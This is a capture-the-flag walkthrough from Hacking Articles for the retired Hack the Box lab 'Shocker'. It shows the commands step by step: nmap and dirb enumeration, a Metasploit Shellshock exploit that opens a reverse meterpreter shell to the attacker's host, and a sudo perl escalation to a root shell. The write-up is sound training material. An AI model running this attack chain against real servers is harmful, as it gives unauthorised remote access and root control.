<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Shocker Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-shocker-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-04-03T16:27:02+00:00">April 3, 2018</time><time class="updated" datetime="2025-07-06T17:51:16+00:00">July 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<strong>Shocker</strong>” which is lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level. HTB have two partitions of lab i.e. Active and retired since we can’t submit write up of any Active lab, therefore, we have chosen retried Shocker lab.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Beginners</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file in the victim’s machine.</span></p>
<h5><span style="color: #000000;">Let’s Breach!!!</span></h5>
<p><span style="color: #000000;">Firstly let’s enumerate ports in context to identify running services and open ports of victim’s machine by using the most popular tool Nmap.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.56</pre>
<p><span style="color: #000000;">Awesome!! Nmap has done a remarkable job by dumping the details of services running on open port 80, 2222.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_E-gvR3cNIE/WsOqeM2E4ZI/AAAAAAAAWA4/Tz-7QMArXAYAw6BEqHm147LSpeV9ze3XQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Knowing port 80 is open on the victim’s network we preferred to explore his IP in the browser and the following image as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-62lW-FhUHyE/WsOqeCZyiHI/AAAAAAAAWA8/VXZBaxo-62wp3KCbIom6tX6AFosXq0dUwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Next, we use the dirb tool of kali to enumerate the directories and found some important directories such as /cgi-bin, index.html, server-status</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.56</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-XLlArL1V6i8/WsOqff4wTVI/AAAAAAAAWBQ/q8_Wx_B4KxU54hco64YUBnelfT4hOxS9ACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">As /cgi-bin / is a restricted directory, let’s look for a .sh file in the directory using dirb</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.56/cgi-bin -X .sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-jsMYTIMrggo/WsOqe2_pEII/AAAAAAAAWBE/9sEDw6QkLiEVAy7Ma77bo0HY8ao5AcT-QCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Great we have the user.sh in the cgi-bin directory. </span><span style="color: #000000;">We downloaded the user.sh by opening the URL </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.10.56/cgi-bin/user.sh</pre>
<p><span style="color: #000000;">Now let’s open the user.sh file using cat</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat user.sh</pre>
<p><span style="color: #000000;">If you will Google for Apache web server with URI of /cgi-bin/. You will realize that it could be Shellshock vulnerability, therefore, let for its exploitation using Metasploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Paq9ZNITVH8/WsOqe8S6D_I/AAAAAAAAWBA/Rag_MqfwTQQqqBCJcJW1nN6u3F0NQ026ACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Open a terminal type msfconsole for loading metasploit framework and use following module. This module targets CGI scripts in the Apache web server by setting the HTTP_USER_AGENT environment variable to a malicious function definition.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf exploit(apache_mod_cgi_bash_env_exec) &gt;set rhost 10.10.10.56
msf exploit(apache_mod_cgi_bash_env_exec) &gt;set lhost 10.10.14.6
msf exploit(apache_mod_cgi_bash_env_exec) &gt;set targeturi /cgi-bin/user.sh
msf exploit(apache_mod_cgi_bash_env_exec) &gt;expoit</pre>
<p><span style="color: #000000;">And we got victim’s reverse connection through <strong>meterpreter session 1</strong>. Hence our prediction is true the target was vulnerable to shellshock.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-B-NT6Jvp5d4/WsOqfe5YhvI/AAAAAAAAWBI/-hQoHZVt-wwDS_sQZDaIn8LjIlZnUw42ACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now let’s finish the task by grabbing user.txt and root.txt file. First I move into /home directory and check available files and directories inside it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
ls</pre>
<p><span style="color: #000000;">Here one directory shelly, when I explore /shelly I saw user.txt and use cat command for reading.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd shelly
ls
cat user.txt</pre>
<h5><span style="color: #000000;">Great!!  Here we had completed 1<sup>st</sup> task now move to 2<sup>nd</sup> tasK</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gLxpjJ4204U/WsOqfp3ODiI/AAAAAAAAWBM/tttE4Yg_moYO5AjX4tuoQs8v1b_4bVM2QCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">For accessing root directory we need root privilege therefore next we use python one-liner for spawning pty shell.</span></p>
<p><span style="color: #000000;"><strong>Great!! </strong> I logged in successfully and check shelly’s privileged and roles using <strong>sudo -l</strong> and found he has root privileged and an indication for a directory <strong>/usr/bin/perl</strong> with NOPASSWD. Now let’s get the root.txt by executing the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo perl –e 'exec "/bin/sh"'
id
ls
cat root.txt</pre>
<p><span style="color: #000000;">We have successfully completed the 2<sup>nd</sup> task.</span></p>
<p><span style="color: #000000;"><strong>Enjoy Hacking!!</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1j4hk10s1ZM/WsOqdw66YqI/AAAAAAAAWA0/LmvxItQ3xecczKNVcGQfUytK3TUP_Tj6ACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
